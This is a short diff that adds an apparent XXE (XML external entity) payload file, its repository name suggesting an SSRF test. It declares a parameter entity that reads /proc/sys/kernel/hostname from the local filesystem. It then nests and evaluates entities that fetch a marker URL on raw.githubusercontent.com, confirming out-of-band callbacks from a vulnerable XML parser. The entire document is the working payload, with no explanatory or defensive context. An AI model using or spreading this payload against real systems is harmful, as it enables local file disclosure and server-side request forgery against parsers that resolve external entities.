@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///proc/sys/kernel/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'https://raw.githubusercontent.com/jioja32/tmp-ssrf-test/main/oob_hit_3__proc_sys_kernel_hostname;'>">
+%eval;
+%send;
